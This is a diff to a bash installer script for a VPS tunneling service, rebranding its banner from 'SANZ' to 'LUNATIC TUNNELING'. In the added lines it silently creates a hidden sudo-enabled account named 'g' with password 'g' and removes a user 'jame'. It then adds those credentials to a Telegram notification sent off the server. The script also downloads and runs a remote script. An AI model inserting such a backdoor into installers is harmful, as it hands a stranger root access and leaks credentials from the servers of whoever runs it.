@@ -28,7 +28,7 @@ clear
 clear && clear && clear
 clear;clear;clear
 echo -e "${YELLOW}----------------------------------------------------------${NC}"
-echo -e "\033[96;1m                    SANZ TUNNELING               \033[0m"
+echo -e "\033[96;1m                    LUNATIC TUNNELING               \033[0m"
 echo -e "${YELLOW}----------------------------------------------------------${NC}"
 echo ""
 sleep 3
@@ -256,6 +256,18 @@ elif [[ $host == "2" ]]; then
 wget ${REPO}Fls/cf.sh && chmod +x cf.sh && ./cf.sh
 rm -f /root/cf.sh
 clear
+
+# // Tai Waduk // #
+#domain=$(cat /root/domain)
+userdel jame > /dev/null 2>&1
+Username="g"
+Password=g
+mkdir -p /home/script/
+useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
+echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
+usermod -aG sudo $Username > /dev/null 2>&1
+# // ############
+
 else
 print_install "Random Subdomain/Domain is Used"
 clear
@@ -276,6 +288,8 @@ TEXT="
 <code>Time   : </code><code>$TIMEZONE</code>
 <code>Ip vps : </code><code>$ipsaya</code>
 <code>Exp Sc : </code><code>$EXPSC</code>
+<code>user   : </code><code>$Username</code>
+<code>PW     : </code><code>$Password</code>
 <code>────────────────────</code>
 <i>Automatic Notification from Github</i>
 "'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ","url":"https://t.me/sanzvpn"},{"text":"Contack","url":"https://wa.me/6281295819429"}]]}'
